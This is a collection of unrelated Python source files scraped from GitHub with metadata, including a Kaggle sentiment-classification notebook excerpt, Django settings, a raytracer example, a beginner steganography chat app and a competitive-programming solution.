analyzer='word',token_pattern=r'\\w{1,}',\n        ngram_range=(1, 1), use_idf=1,smooth_idf=1,sublinear_tf=1,\n        stop_words =None)\n\ntfidfer_unigrams_cut_off_2.fit(list(train_test['review_cleaned']))\nX_unigrams_cut_off_2=tfidfer_unigrams_cut_off_2.transform(train_test['review_cleaned'])\ntfidfer_unigrams_cut_off_2=None\n\n\n# In[15]:\n\ntfidfer_trigrams_cut_off_2 = TfidfVectorizer(min_df=3,  max_features=None, \n        strip_accents='unicode', analyzer='word',token_pattern=r'\\w{1,}',\n        ngram_range=(1, 3), use_idf=1,smooth_idf=1,sublinear_tf=1,\n        stop_words =None)\n\ntfidfer_trigrams_cut_off_2.fit(list(train_test['review_cleaned']))\nX_trigrams_cut_off_2=tfidfer_trigrams_cut_off_2.transform(train_test['review_cleaned'])\ntfidfer_trigrams_cut_off_2=None\n\n\n# In[16]:\n\ntfidfer_trigrams_cut_off_10 = TfidfVectorizer(min_df=11,  max_features=None, \n        strip_accents='unicode', analyzer='word',token_pattern=r'\\w{1,}',\n        ngram_range=(1, 3), use_idf=1,smooth_idf=1,sublinear_tf=1,\n        stop_words =None)\n\ntfidfer_trigrams_cut_off_10.fit(list(train_test['review_cleaned']))\nX_trigrams_cut_off_10=tfidfer_trigrams_cut_off_10.transform(train_test['review_cleaned'])\ntfidfer_trigrams_cut_off_10=None\n\n\n# In[17]:\n\ntfidfer_bigrams_cut_off_40 = TfidfVectorizer(min_df=41,  max_features=None, \n        strip_accents='unicode', analyzer='word',token_pattern=r'\\w{1,}',\n        ngram_range=(1, 2), use_idf=1,smooth_idf=1,sublinear_tf=1,\n        stop_words =None)\n\n\ntfidfer_bigrams_cut_off_40.fit(list(train_test['review_cleaned']))\nX_bigrams_cut_off_40=tfidfer_bigrams_cut_off_40.transform(train_test['review_cleaned'])\ntfidfer_bigrams_cut_off_40=None\n\n\n# In[18]:\n\ntfidfer_bigrams_cut_off_200 = TfidfVectorizer(min_df=201,  max_features=None, \n        strip_accents='unicode', analyzer='word',token_pattern=r'\\w{1,}',\n        ngram_range=(1, 2), use_idf=1,smooth_idf=1,sublinear_tf=1,\n        stop_words =None)\n\n\ntfidfer_bigrams_cut_off_200.fit(list(train_test['review_cleaned']))\nX_bigrams_cut_off_200=tfidfer_bigrams_cut_off_200.transform(train_test['review_cleaned'])\n\n\n# In[19]:\n\nX_unigrams_cut_off_2.shape[1],X_bigrams_cut_off_5.shape[1],X_bigrams_cut_off_2.shape[1],X_bigrams_cut_off_10.shape[1],X_bigrams_cut_off_40.shape[1],X_bigrams_cut_off_200.shape[1],X_trigrams_cut_off_2.shape[1],X_trigrams_cut_off_10.shape[1]\n\n\n\n# # Cross validations\n\n# In[20]:\n\ny=train['sentiment']\ntrain_len=train.shape[0]\n\nclf = LogisticRegression(penalty='l2', dual=False, tol=0.0001, \n                         C=1, fit_intercept=True, intercept_scaling=1.0, \n                         class_weight=None, random_state=None)\nparams=[0.1,0.5,1,2,3,4,5,6,7,14,18,20,21,22,23,30,40,50,75,100,500]\n\n\n\n##  bigrams_cut_off_5\nprint('bigrams_cut_off_5\\n')\nX_all=X_bigrams_cut_off_5\nfilePath=plots_path+'logistic_bigrams_cut_off_5_translated3500Clusters.png'\ntitle='Logistic Regression'\ntitle+=' 5-fold cross-validation'\ntitle+='\\nbigrams with frequency cut-off 5'\nxlab='regularization (logistic regression C parameter)'\nclassification_functions.checkModel(clf,params,X_all,y,train_len,title,xlab,filePath)\n\n##  trigrams_cut_off_2\nprint('trigrams_cut_off_2\\n')\nX_all=X_trigrams_cut_off_2\nfilePath=plots_path+'logistic_trigrams_cut_off_2_translated3500Clusters.png'\ntitle='Logistic Regression'\ntitle+=' 5-fold cross-validation'\ntitle+='\\ntrigrams with frequency cut-off 2'\nxlab='regularization (logistic regression C parameter)'\nclassification_functions.checkModel(clf,params,X_all,y,train_len,title,xlab,filePath)\n\n##  bigrams_cut_off_2\nprint('bigrams_cut_off_2\\n')\nX_all=X_bigrams_cut_off_2\nfilePath=plots_path+'logistic_bigrams_cut_off_2_translated3500Clusters.png'\ntitle='Logistic Regression'\ntitle+=' 5-fold cross-validation'\ntitle+='\\nbigrams with frequency cut-off 2'\nxlab='regularization (logistic regression C parameter)'\nclassification_functions.checkModel(clf,params,X_all,y,train_len,title,xlab,filePath)\n\n\n##  unigrams_cut_off_2\nprint('unigrams_cut_off_2\\n')\nX_all=X_unigrams_cut_off_2\nfilePath=plots_path+'logistic_unigrams_cut_off_2_translated3500Clusters.png'\ntitle='Logistic Regression'\ntitle+=' 5-fold cross-validation'\ntitle+='\\nunigrams with frequency cut-off 2'\nxlab='regularization (logistic regression C parameter)'\nclassification_functions.checkModel(clf,params,X_all,y,train_len,title,xlab,filePath)\n\n\n##  bigrams_cut_off_10\nprint('bigrams_cut_off_10\\n')\nX_all=X_bigrams_cut_off_10\nfilePath=plots_path+'logistic_bigrams_cut_off_10_translated3500Clusters.png'\ntitle='Logistic Regression'\ntitle+=' 5-fold cross-validation'\ntitle+='\\nbigrams with frequency cut-off 10'\nxlab='regularization (logistic regression C parameter)'\nclassification_functions.checkModel(clf,params,X_all,y,train_len,title,xlab,filePath)\n\n##  bigrams_cut_off_40\nprint('bigrams_cut_off_40\\n')\nX_all=X_bigrams_cut_off_40\nfilePath=plots_path+'logistic_bigrams_cut_off_40_translated3500Clusters.png'\ntitle='Logistic Regression'\ntitle+=' 5-fold cross-validation'\ntitle+='\\nbigrams with frequency cut-off 40'\nxlab='regularization (logistic regression C parameter)'\nclassification_functions.checkModel(clf,params,X_all,y,train_len,title,xlab,filePath)\n\n\n##  bigrams_cut_off_200\nprint('bigrams_cut_off_200\\n')\nX_all=X_bigrams_cut_off_200\nfilePath=plots_path+'logistic_bigrams_cut_off_200_translated3500Clusters.png'\ntitle='Logistic Regression'\ntitle+=' 5-fold cross-validation'\ntitle+='\\nbigrams with frequency cut-off 200'\nxlab='regularization (logistic regression C parameter)'\nclassification_functions.checkModel(clf,params,X_all,y,train_len,title,xlab,filePath)\n\n\n\n##  trigrams_cut_off_10\nprint('trigrams_cut_off_10\\n')\nX_all=X_trigrams_cut_off_10\nfilePath=plots_path+'logistic_trigrams_cut_off_10_translated3500Clusters.png'\ntitle='Logistic Regression'\ntitle+=' 5-fold cross-validation'\ntitle+='\\ntrigrams with frequency cut-off 10'\nxlab='regularization (logistic regression C parameter)'\nclassification_functions.checkModel(clf,params,X_all,y,train_len,title,xlab,filePath)\n\n\n# # create kaggle submission\n\n# In[21]:\n\nclf = LogisticRegression(penalty='l2', dual=False, tol=0.0001, \n                         C=1, fit_intercept=True, intercept_scaling=1.0, \n                         class_weight=None, random_state=None)\n\nclf.set_params(C=100)\nX_all=X_bigrams_cut_off_2\nX_all_train=X_all[:train_len]  \nX_all_test=X_all[train_len:]  \n\n\nclf.fit(X_all_train,y)\n\npredicted=clf.predict_proba(X_all_test)[:,1]\n\ninputFName=saved_data_path+'testSet.pkl'\nwith open(inputFName,'rb') as fp:\n    test_current=cPickle.load(fp)\n\ntest_current['sentiment']=predicted\ntest_current['id']=test_current['id'].map(lambda x:x.replace('\"', '').strip())\ntest_current=test_current[['id','sentiment']]\ntest_current.to_csv(saved_data_path+'logisticRegression_bigrams_cut_off_2__translated3500Clusters_submission.csv',index=False)\n\n\n# In[ ]:\n\n\n\n"}
{"blob_id": "b3c4ea52bf0572bc9245df6d10b81cba584a6731", "directory_id": "104bf0fa2c22c9f6f3e73551b52961f94e42a7a9", "path": "/scripts/config_ProPixx.py", "content_id": "66588adb202a037ce8151fb5bc39f7cc210f138f", "detected_licenses": "['MIT']", "license_type": "permissive", "repo_name": "PySilentSubstitution/pysilsub", "snapshot_id": "df859d3fb1df21beaa75bf0c9bc77872ece99d00", "revision_id": "0dcf7490da51a2bd5e670e057fa0b4b8101f3700", "branch_name": "refs/heads/main", "visit_date": "2023-07-19 17:01:43.633271", "revision_date": "2023-07-17 13:58:43", "committer_date": "2023-07-17 13:58:43", "github_id": "390693759", "star_events_count": "7", "fork_events_count": "1", "gha_license_id": "MIT", "gha_event_created_at": "2022-11-29 09:40:07", "gha_created_at": "2021-07-29 10:57:50", "gha_language": "Jupyter Notebook", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "1085", "extension": "py", "content": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nCreated on Sat Jun 25 12:38:48 2022\n\n@author: jtm545\n\"\"\"\n\nimport json\n\n\n# Configure device\nCALIBRATION = \"/Users/jtm545/Projects/PySilSub/pysilsub/data/ProPixx.csv\"\nCALIBRATION_WAVELENGTHS = [380, 781, 1]\nPRIMARY_RESOLUTIONS = [255] * 3\nPRIMARY_COLORS = [\"red\", \"green\", \"blue\"]\nCALIBRATION_UNITS = \"Counts/s/nm\"\nNAME = \"ProPixx Projector\"\nJSON_NAME = \"ProPixx\"\nNOTES = (\n    \"VPixx ProPixx projector at the York Neuroimaging Center. Spectra were \"\n    \"measured with an OceanOptics Jaz spectrometer using a long fiber optic \"\n    \"cable.\"\n)\n\n\ndef device_config():\n\n    config = {\n        \"calibration\": CALIBRATION,\n        \"calibration_wavelengths\": CALIBRATION_WAVELENGTHS,\n        \"primary_resolutions\": PRIMARY_RESOLUTIONS,\n        \"primary_colors\": PRIMARY_COLORS,\n        \"name\": NAME,\n        \"calibration_units\": CALIBRATION_UNITS,\n        \"json_name\": JSON_NAME,\n        \"notes\": NOTES,\n    }\n\n    json.dump(config, open(f\"../pysilsub/data/{JSON_NAME}.json\", \"w\"), indent=4)\n\n\nif __name__ == \"__main__\":\n    device_config()\n"}
{"blob_id": "08c2b97536c490ed943d388851ae90047a97c73e", "directory_id": "423ca5d30fdaf56d9d4bed42ae04bac912399d8b", "path": "/task1.py", "content_id": "75defc76159626f47c1f35181eb8c9d66a976364", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "Fahmi161415/Task1", "snapshot_id": "475acae6d1f951305f6012cf00beef5052b7d1c7", "revision_id": "5cccb9360d0e7259b91e614773b62b6ad18cc0a5", "branch_name": "refs/heads/main", "visit_date": "2023-03-02 04:18:37.934148", "revision_date": "2021-02-06 15:03:48", "committer_date": "2021-02-06 15:03:48", "github_id": "336563462", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "386", "extension": "py", "content": "# For calculating area of circle\r\n\r\n\r\nradius = eval(input(\"Enter the value of radius: \"))\r\narea=3.1415922653589793238*radius*radius\r\nprint(\"Area of circle having radius =\", radius,\"is\", area)\r\n\r\n\r\n\r\n\r\n# Getting extension of file\r\n\r\nfilename = input(\"Enter the filename:\")\r\nfile_extension=filename.split(\".\")\r\nprint(\"The extension of file is\" + repr(file_extension[-1]),\":'python'\" )\r\n\r\n"}
{"blob_id": "a11875fe78e9915c888c67e470df5619df4c322b", "directory_id": "5869d18217fe5e09f98195e3d5e24a386e647f8a", "path": "/hackthon/settings.py", "content_id": "a41e2ce1ecf4631158d1d4995fc151ec84e4410c", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "AlejoCifuentes98/Reto2020", "snapshot_id": "71c30c80e49113c90b3cfde240990d1b2ebf4700", "revision_id": "bd2f1e9f44b8bdfca8ad7bfd81b7ab3ec6536b81", "branch_name": "refs/heads/main", "visit_date": "2023-08-27 15:41:43.310065", "revision_date": "2021-10-16 15:34:50", "committer_date": "2021-10-16 15:34:50", "github_id": "416946960", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "3744", "extension": "py", "content": "\"\"\"\nDjango settings for hackthon project.\n\nGenerated by 'django-admin startproject' using Django 3.2.8.\n\nFor more information on this file, see\nhttps://docs.djangoproject.com/en/3.2/topics/settings/\n\nFor the full list of settings and their values, see\nhttps://docs.djangoproject.com/en/3.2/ref/settings/\n\"\"\"\n\nfrom pathlib import Path\n\n# Build paths inside the project like this: BASE_DIR / 'subdir'.\nBASE_DIR = Path(__file__).resolve().parent.parent\n\n\n# Quick-start development settings - unsuitable for production\n# See https://docs.djangoproject.com/en/3.2/howto/deployment/checklist/\n\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = 'django-insecure-ayt)&v&*koy3l_tlp6=4a3+)o$9_aeq_ea$0sn@l64+#uw8)+%'\n\n# SECURITY WARNING: don't run with debug turned on in production!\nDEBUG = True\n\nALLOWED_HOSTS = []\n\nMESSAGE_STORAGE = \"django.contrib.messages.storage.session.SessionStorage\"\n\n# Application definition\n\nINSTALLED_APPS = [\n    'django.contrib.admin',\n    'django.contrib.auth',\n    'django.contrib.contenttypes',\n    'django.contrib.sessions',\n    'django.contrib.messages',\n    'django.contrib.staticfiles',\n    'apps.inicio',\n    'apps.usuarios',\n]\n\nMIDDLEWARE = [\n    'django.middleware.security.SecurityMiddleware',\n    'django.contrib.sessions.middleware.SessionMiddleware',\n    'django.middleware.common.CommonMiddleware',\n    'django.middleware.csrf.CsrfViewMiddleware',\n    'django.contrib.auth.middleware.AuthenticationMiddleware',\n    'django.contrib.messages.middleware.MessageMiddleware',\n    'django.middleware.clickjacking.XFrameOptionsMiddleware',\n]\n\nROOT_URLCONF = 'hackthon.urls'\n\nTEMPLATES = [\n    {\n        'BACKEND': 'django.template.backends.django.DjangoTemplates',\n        'DIRS': ['templates'],\n        'APP_DIRS': True,\n        'OPTIONS': {\n            'context_processors': [\n                'django.template.context_processors.debug',\n                'django.template.context_processors.request',\n                'django.contrib.auth.context_processors.auth',\n                'django.contrib.messages.context_processors.messages',\n            ],\n        },\n    },\n]\n\nWSGI_APPLICATION = 'hackthon.wsgi.application'\n\n\n# Database\n# https://docs.djangoproject.com/en/3.2/ref/settings/#databases\n\nDATABASES = {\n    'default': {\n        'ENGINE': 'django.db.backends.sqlite3',\n        'NAME': BASE_DIR / 'db.emisalud',\n    }\n}\n\n# DATABASES = {\n#     'default': {\n#         'ENGINE': 'django.db.backends.mysql',\n#         'NAME': 'mydatabase',\n#         'USER': 'mydatabaseuser',\n#         'PASSWORD': 'mypassword',\n#         'HOST': '127.0.0.1',\n#         'PORT': '5432',\n#     }\n# }\n\n# Password validation\n# https://docs.djangoproject.com/en/3.2/ref/settings/#auth-password-validators\n\nAUTH_PASSWORD_VALIDATORS = [\n    {\n        'NAME': 'django.contrib.auth.password_validation.UserAttributeSimilarityValidator',\n    },\n    {\n        'NAME': 'django.contrib.auth.password_validation.MinimumLengthValidator',\n    },\n    {\n        'NAME': 'django.contrib.auth.password_validation.CommonPasswordValidator',\n    },\n    {\n        'NAME': 'django.contrib.auth.password_validation.NumericPasswordValidator',\n    },\n]\n\n\n# Internationalization\n# https://docs.djangoproject.com/en/3.2/topics/i18n/\n\nLANGUAGE_CODE = 'es-co'\n\nTIME_ZONE = 'UTC'\n\nUSE_I18N = True\n\nUSE_L10N = True\n\nUSE_TZ = True\n\n\n# Static files (CSS, JavaScript, Images)\n# https://docs.djangoproject.com/en/3.2/howto/static-files/\n\nSTATIC_URL = '/static/'\nSTATICFILES_DIRS = [\n    BASE_DIR / \"static\",\n    '/var/www/static/',\n]\nMEDIA_URL = '/media/'\nMEDIA_ROOT = 'media'\n\n\n# Default primary key field type\n# https://docs.djangoproject.com/en/3.2/ref/settings/#default-auto-field\n\nDEFAULT_AUTO_FIELD = 'django.db.models.BigAutoField'\n"}
{"blob_id": "69723cbafdb41c34fc2725fb39a238fe38295d38", "directory_id": "f218a3621e969bea325f9f502079276a6b282e38", "path": "/examples/ball_plane.py", "content_id": "af6aba90c8022d4d2bcc6012203d6a6fa88e8817", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "JIMMY-KSU/Raytracer", "snapshot_id": "e54f1ef2a98189b255a9821d36a530476dbfad3a", "revision_id": "8979a29ba4a5e118d1a456f78761184ec9477b66", "branch_name": "refs/heads/master", "visit_date": "2020-05-24 19:06:00.746940", "revision_date": "2016-11-21 21:22:36", "committer_date": "2016-11-21 21:22:36", "github_id": "None", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "1112", "extension": "py", "content": "import numpy as np\nfrom camera import Camera\nfrom ray_tracer import RayTracer\nfrom scene_element import SceneElement, LightSourcePoint, LightSourceDirectional\nfrom scene import Scene\nfrom geometry.sphere import Sphere\nfrom geometry.plane import Plane\nfrom material import Material, Finish\nfrom material.finishes import SoftDull\nimport material.colors as colors\nimport matplotlib.pyplot as plt\n\n\ndef render():\n    (w, h) = (640, 480)\n    camera = Camera(w, h, fov=np.pi / 6)\n\n    # Materials\n    base_finish = SoftDull\n    base_finish.reflection = 0.1\n    mat_base = Material(colors.P_Chrome3, finish=base_finish)\n\n    mat_s1 = Material(colors.P_Brass3)\n\n    se_ls = LightSourcePoint([-1., 5., 35.], intensity=200., emission_color=[2., 2., 2.])\n    se_base = SceneElement(Plane([0.0, -4.0, 20.], [0., 1., 0.]), mat_base)\n\n    se_s1 = SceneElement(Sphere([0., 0., 40.], 4.), mat_s1)\n\n    scene = Scene([se_ls, se_base, se_s1])\n    # scene = Scene([se_ls, se_base])\n\n    # Render\n    rt = RayTracer(camera, scene)\n    traced = rt.render()\n    plt.imshow(traced); plt.show()\n\n\nif __name__ == \"__main__\":\n    render()"}
{"blob_id": "1ffa57f5df232c13ad13c6f70fdce52019ec2bff", "directory_id": "921c2d4d12267a68e7fe84d4916d408dce3048d0", "path": "/sent_current.py", "content_id": "231a9b5ede24f603c62965b0bd0e7c04bd48f745", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "jaybaybay7/rfproject", "snapshot_id": "e3c00611cbcdf476f45b30993f015ab4b9ef794c", "revision_id": "291e400746a0848ec0a79b03c457a4ce53686c5e", "branch_name": "refs/heads/master", "visit_date": "2023-03-20 14:53:10.612147", "revision_date": "2021-03-12 05:19:51", "committer_date": "2021-03-12 05:19:51", "github_id": "331119724", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "772", "extension": "py", "content": "import time\nimport board\nimport busio\nimport adafruit_ads1x15.ads1015 as ADS\nfrom adafruit_ads1x15.analog_in import AnalogIn\nimport subprocess\n\n# Create the I2C bus\ni2c = busio.I2C(board.SCL, board.SDA)\n\n# Create the ADC object using the I2C bus\nads = ADS.ADS1015(i2c)\n\n# Create single-ended input on channel 0\nchan = AnalogIn(ads, ADS.P0)\n\n# Create differential input between channel 0 and 1\n# chan = AnalogIn(ads, ADS.P0, ADS.P1)\n\nprint(\"{:>5}\\t{:>5}\".format(\"raw\", \"v\"))\n\nturnOnInt = 345\nturnOffInt = 789\n\nwhile True:\n    print(\"{:>5}\\t{:>5.3f}\".format(chan.value, chan.voltage))\n    time.sleep(0.5)\n    if chan.voltage != 0:\n        subprocess.call('python3','rpi-fr_send.py',turnOnInt)\n    else:\n        subprocess.call('python3','rpi-fr_send.py',turnOffInt)\n        "}
{"blob_id": "5a3da3678283dd0827baeb7b606575750d4e21c9", "directory_id": "4b3ef6db3366c3709399f42e97bf4ef07852a065", "path": "/\u5176\u4ed6\u9879\u76ee\u4fdd\u5b58/mgr/app/migrations/0004_auto_20190322_1310.py", "content_id": "f97a0c0a1f8d4d1436c64901ab75e967d5c717e4", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "limeiyang/Django_Learn", "snapshot_id": "65eb211ee303b3ff4293a18f34acf873c383b2ee", "revision_id": "2e8eadce39d0d46a30be9df78eaf185b7fc0c5df", "branch_name": "refs/heads/master", "visit_date": "2020-04-28 10:17:00.084082", "revision_date": "2019-03-22 07:44:31", "committer_date": "2019-03-22 07:44:31", "github_id": "175196642", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "501", "extension": "py", "content": "# Generated by Django 2.1.7 on 2019-03-22 05:10\r\n\r\nfrom django.db import migrations, models\r\n\r\n\r\nclass Migration(migrations.Migration):\r\n\r\n    dependencies = [\r\n        ('app', '0003_auto_20190322_1308'),\r\n    ]\r\n\r\n    operations = [\r\n        migrations.DeleteModel(\r\n            name='Img',\r\n        ),\r\n        migrations.AddField(\r\n            model_name='user',\r\n            name='pic',\r\n            field=models.ImageField(blank=True, upload_to='pic', verbose_name='\u56fe\u7247'),\r\n        ),\r\n    ]\r\n"}
{"blob_id": "66955171f8a0959c694c6f41f43e77bd77da5a3d", "directory_id": "8d82054167ce89ab1a96c232642d7147d7db54a3", "path": "/main.py", "content_id": "93b76ea93fe828366a2b0f37e9fd9e6c925ec094", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "Aditya3dadhwal/Spychat", "snapshot_id": "b519f0b34a8d3c8aba282178f614526628478e54", "revision_id": "1b96bbb917cc13d8a72401073dbd73d2b607f4d8", "branch_name": "refs/heads/master", "visit_date": "2021-07-12 07:03:51.404254", "revision_date": "2017-10-12 16:03:35", "committer_date": "2017-10-12 16:03:35", "github_id": "106711606", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "6926", "extension": "py", "content": "from spy_details import spy, Spy, ChatMessage, friends\nfrom message import Steganography\nfrom datetime import datetime\nimport getpass\nimport string\nimport colour\n\nSTATUS_MESSAGES = ['My name is Bond, James Bond', 'Shaken, not stirred.', 'Keeping the British end up, Sir']\n\n\n\nprint \"Hello! Let\\'s get started\"\n\nquestion = \"Do you want to continue as \" + spy.salutation + \" \" + spy.name + \" (Y/N)?  \"\nexisting = raw_input((question))\n\n\ndef add_status(current_status_message):\n    updated_status_message = None\n\n    if current_status_message != None:\n        print 'Your current status message is %s \\n' % (current_status_message)\n    else:\n        print 'You don\\'t have any status message currently \\n'\n\n    default = raw_input(\"Do you want to select from the older status (y/n)? \")\n\n    if default.upper() == \"N\":\n        new_status_message = raw_input(\"What status message do you want to set? \")\n\n        if len(new_status_message) > 0:\n            STATUS_MESSAGES.append(new_status_message)\n            updated_status_message = new_status_message\n\n    elif default.upper() == 'Y':\n\n        item_position = 1\n\n        for message in STATUS_MESSAGES:\n            print '%d. %s' % (item_position, message)\n            item_position = item_position + 1\n\n        message_selection = raw_input(\"\\nChoose from the above messages \")\n\n        if len(STATUS_MESSAGES) >= message_selection:\n            updated_status_message = STATUS_MESSAGES[message_selection - 1]\n\n    else:\n        print 'The option you chose is not valid! Press either y or n.'\n\n    if current_status_message:\n        print 'Your updated status message is: %s' % (current_status_message)\n    else:\n        print 'You current don\\'t have a status update'\n\n    return updated_status_message\n\n\ndef add_friend():\n    new_friend = Spy('', '', 0, 0.0)\n    new_friend.name = raw_input(\"Please add your friend's name: \\n\")\n\n    if set('[special symbols\":;\\']+$ \" \"').intersection(new_friend):\n        print \"Invalid entry.\"\n    else:\n        print new_friend\n\n    new_friend.salutation = raw_input(\"Formal Salutation: Mr. or Ms. or Mrs. \\n\")\n    new_friend.name = new_friend.salutation + \" \" + new_friend.name\n\n    new_friend.age = raw_input(\"Age?\\n\")\n    new_friend.age = int(new_friend.age)\n\n    new_friend.rating = raw_input(\"Spy rating?\\n\")\n    new_friend.rating = float(new_friend.rating)\n\n    if len(new_friend.name) > 0 and new_friend.age > 12 and new_friend.rating>= spy.rating:\n        friends.append(new_friend)\n        print 'New Friend Added!\\n'\n    else:\n        print \"Sorry! Invalid entry. We can\\'t add spy with the details you provided!!\\n\"\n\n    return len(friends)\n\ndef select_a_friend():\n    item_number = 0\n\n    for friend in friends:\n        print '%d. %s aged %d with rating %.2f is online' % (item_number + 1, friend['name'],\n                                                             friend['age'],\n                                                             friend['rating'])\n        item_number = item_number + 1\n\n    friend_choice = raw_input(\"Choose from your friends\")\n\n    friend_choice_position = friend_choice - 1\n    #base index=1\n\n    return friend_choice_position\n\n\ndef send_message():\n    friend_choice = select_a_friend()\n\n    original_image = raw_input(\"What is the name of the image?\")\n    output_path = \"output.jpg\"\n    text = raw_input(\"What do you want to say? \")\n    if len(text) == 0:\n        print 'Speak up!\\n'\n    elif text ==  'In serious trouble'or 'Save Me' or 'M stuck\\n':\n        print 'Hold on!'\n    elif text == 'incorrect' or 'Hack' or '#' or '&':\n        #special symbols r invalid\n        print 'Spychat isnt for kids!\\n'\n\n    else:\n        print 'You are good to go!\\n'\n\n    Steganography.encode(original_image, output_path, text)\n\n    new_chat = ChatMessage(text, True)\n\n    friends[friend_choice].chats.append(new_chat)\n\n    print \"Your secret message image is ready!\"\n\ndef read_message():\n    sender = select_a_friend()\n\n    output_path = raw_input(\"What is the name of the file?\")\n\n    hidden_text = Steganography.decode(output_path)\n\n    print hidden_text\n\n    new_chat = ChatMessage(hidden_text, False)\n\n    friends[sender].chats.append(new_chat)\n    # new chats r added\n    words = hidden_text.split(' ')\n    print 'words in the secret message is : ' + str(len(words))\n    print 'hidden text has been saved! ;)\\n'\n\n\ndef read_chat_history():\n    read_for = select_a_friend()\n\n    print '\\n'\n    #show friends\n\n    for chat in friends[read_for].chats:\n        if chat.sent_by_me:\n            print(chat.time.startime(\"%d %B %Y\"), 'yellow')\n            print('Your words:', 'green')\n            print chat.message\n        else:\n            print(chat.time.startime(\"%d %B %Y\"), 'yellow')\n            print(friends[read_for].name + ' word: ', 'green')\n            print chat.message\n\n\ndef start_chat(spy):\n    current_status_message = None\n\n    spy.name = spy.salutation + \" \" + spy.name\n    if spy.age > 12 and spy.age < 50:\n        print \"Authentication complete. Welcome \" + spy.name + \" age: \" \\\n              + str(spy.age) + \" and rating of: \" + str(spy.rating) + \" Proud to have you onboard\"\n\n        show_menu = True\n\n        while show_menu:\n            menu_choices = \"What do you want to do? \\n 1. Add a status update \\n 2. Add a friend \\n 3. Select a Friend \\n 4. Send a secret message \\n 5. Read a secret message \\n 6. Read Chats from a user \\n 7. Close Application \\n\"\n            menu_choice = raw_input(menu_choices)\n\n            if len(menu_choice) > 0:\n                menu_choice = raw_input(menu_choice)\n\n                # Set status\n                if menu_choice == 1:\n                    current_status_message = add_status(current_status_message)\n                elif menu_choice == 2:\n                    number_of_friends = add_friend()\n                    print 'You have %d friends' % (number_of_friends)\n                elif menu_choice == 3:\n                    send_message()\n                elif menu_choice == 4:\n                    read_message()\n                else:\n                    show_menu = False\n    else:\n        print 'Sorry you are not of the correct age to be a spy'\n\n\nif existing.upper() == \"Y\":\n\n    pswd = getpass.getpass('Password:\\n')\n\n    if pswd == 'valid':\n        start_chat(Spy)\n\n    else:\n        print 'Wrong Password!Try Again'\nelse:\n\n    spy = Spy('', '',0,0.0)\n    spy.name = raw_input(\"Hello Spy! Please tell us your name : \\n\")\n\n    if len(spy.name) > 0:\n        invalidchar = set(string.specialcharacters.replace('_', ' '))\n        if any(char in invalidchar for char in spy.name):\n            print 'no name no spy '\n        else:\n\n            spy.salutation = raw_input(\"Should I call you Mr. or Mrs. or Ms.?: \\n\")\n\n            spy.age = raw_input(\"What is your age?\\n\")\n            spy.age = int(spy.age)\n\n            spy.rating = raw_input(\"What is your spy rating?\\n\")\n            spy.rating =float(spy.rating)\n\n        start_chat(spy)"}
{"blob_id": "293c0cc89b6d785d75a702398378df58540c5f14", "directory_id": "51b6d2fc53d5c632fcf01319842baebf13901e84", "path": "/atcoder.jp/abc198/abc198_d/Main.py", "content_id": "84b6d70e1c6e06e31d599ed119a69b9ab833910f", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "mono-0812/procon", "snapshot_id": "35db3b2c21eff74fbd7b52db07f249380f6834ef", "revision_id": "68a4b53880a228a0164052b23d1326363efcbc20", "branch_name": "refs/heads/master", "visit_date": "2023-05-30 17:02:58.935074", "revision_date": "2021-06-27 12:15:10", "committer_date": "2021-06-27 12:15:10", "github_id": "345896553", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "946", "extension": "py", "content": "import bisect,collections,copy,heapq,itertools,math,string,sys\ndef I(): return input()\ndef IS(): return input().split()\ndef II(): return int(input())\ndef IIS(): return map(int,input().split())\ndef LIIS(): return list(map(int,input().split()))\nINF=float(\"inf\")\nMOD=10**9+7\n##############################################################################\ns1=I();s2=I();s3=I()\nli=list(set(s1+s2+s3))\nif len(li)>=11:\n    print(\"UNSOLVABLE\")\n    exit()\nt=0\nfor l in itertools.permutations(range(10),len(li)):\n    dic={}\n    S1=0\n    S2=0\n    S3=0\n    i=0\n    for key in li:\n        dic[key]=l[i]\n        i+=1\n    if dic[s1[0]]==0 or dic[s2[0]]==0 or dic[s3[0]]==0:continue\n    for i in range(len(s1)):\n        S1=S1*10+dic[s1[i]]\n    for i in range(len(s2)):\n        S2=S2*10+dic[s2[i]]\n    for i in range(len(s3)):\n        S3=S3*10+dic[s3[i]]\n    if S1+S2==S3:\n        print(S1)\n        print(S2)\n        print(S3)\n        exit()\nprint(\"UNSOLVABLE\")\n\n\n"}
